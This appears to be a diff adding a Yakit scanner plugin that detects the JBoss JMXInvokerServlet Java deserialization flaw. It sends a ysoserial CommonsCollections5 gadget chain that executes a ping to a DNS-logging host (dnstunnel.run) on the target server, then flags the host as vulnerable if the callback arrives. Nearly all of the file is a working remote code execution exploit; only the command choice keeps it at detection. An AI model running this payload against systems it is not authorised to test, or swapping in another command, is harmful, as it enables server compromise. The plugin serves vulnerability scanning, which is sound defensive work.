@@ -1,0 +1,77 @@
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+server,token,err = risk.NewDNSLogDomain()
+data = str.f("ping -c 1 %s.dnstunnel.run",token)
+payload,err = yso.GetCommonsCollections5(data)
+payload = java.MarshalJavaObjects(payload)
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    packet = `
+POST /invoker/JMXInvokerServlet HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+{{params(payload)}}`
+    rsp,req,_ = poc.HTTP(packet, 
+    poc.params({"target":addr,"payload":payload}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    sleep(2)
+    
+    dnsdata,dnserr = risk.CheckDNSLogByToken(token)
+    if dnserr != nil {
+        yakit.Error("Not Found JBoss JMXInvokerServlet 反序列化漏洞")
+        return
+    }
+
+    // dump(rsp)
+    if len(rsp) > 0 {
+        if len(dnsdata) > 0 {
+            yakit.Info("%v JBoss JMXInvokerServlet 反序列化漏洞", addr)
+            risk.NewRisk(
+                addr,risk.title("JBoss JMXInvokerServlet 反序列化漏洞"),
+                risk.severity("high"),
+                risk.titleVerbose("JBoss JMXInvokerServlet 反序列化漏洞"),
+                risk.type("反序列化[JBoss]"),
+            )
+        }
+    }
+
+    return
+}
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+
+    // dump(result.GetServiceName())
+    // println("-------------------------------")
+    // dump(result.GetCPEs())
+    // println("-------------------------------")
+    // dump(result.GetDomains())
+    // println("-------------------------------")
+    // dump(result.GetHtmlTitle())
+    // println("-------------------------------")
+    // dump(result.GetProto())
+
+    if len(result.Fingerprint.HttpFlows)>0{
+        if str.MatchAllOfSubString(result.GetServiceName(), "jboss") {
+            handleCheck(result.Target,result.Port)  
+        }
+    }
+    
+}
